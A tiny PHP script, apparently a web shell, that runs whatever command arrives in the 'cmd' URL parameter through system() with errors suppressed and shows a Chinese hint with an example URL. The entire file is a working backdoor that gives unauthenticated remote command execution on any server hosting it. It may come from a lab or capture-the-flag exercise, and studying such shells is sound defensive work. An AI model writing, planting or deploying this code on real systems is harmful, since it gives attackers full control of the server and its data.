<?php
error_reporting(0);
function ben($b){
    system($b);
}
if($_GET['cmd']) {
    $a=$_GET['cmd'];
    ben($a);
}else{
    echo "请输入要执行的命令，例如：http://ip/?cmd=ls";
}
?>